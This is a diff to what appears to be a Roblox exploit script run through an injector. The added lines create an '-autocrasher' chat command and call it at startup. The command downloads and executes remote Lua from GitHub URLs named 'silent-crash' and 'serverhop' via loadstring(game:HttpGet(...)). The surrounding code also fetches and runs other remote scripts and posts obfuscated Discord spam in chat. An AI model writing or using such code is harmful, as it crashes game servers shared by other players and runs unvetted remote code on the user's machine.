@@ -8,6 +8,7 @@ local AllowTeleportsToShortcutHub = false -- Disabling this will stop all shortc
 
 function startupScripts() -- Everything in here will be ran LAST!(Great for your after inject scripts idk xd)
 game.Players:Chat("-nok")
+game.Players:Chat("-autocrasher")
 loadstring(game:HttpGet("https://raw.githubusercontent.com/lpkonizopcinfasdf/plamka/main/my_own/'slocklock",true))()
 end
 
@@ -1622,6 +1623,15 @@ game.Players:Chat("-super h \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n
 	if string.sub(msg:lower(), 0, 3) == prefix.."ad" then
 game.Players:Chat("h \n\n\n\n\n\n Hi! íf ƴοû ħåѷȇ đíšçοŕđ ƥ|š ǰοíň ţħíš šȇŕѷȇŕ: . gg/8yHv8EPnEF")
 	end
+if msg == prefix.."autocrasher" then
+-- 
+loopgrab = true
+wait(0.25)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lpkonizopcinfasdf/plamka/main/my_own/silent-crash",true))() 
+wait(10)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lpkonizopcinfasdf/plamka/main/my_own/serverhop",true))()
+end
+
 	if string.sub(msg:lower(), 0, 3) == prefix.."cb" then
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Clickgameplay/no-tag-script/main/.NoTagScript"))()
 loadstring(game:HttpGet(("https://raw.githubusercontent.com/Tech-187/Temp/main/v3-bar-src"),true))()
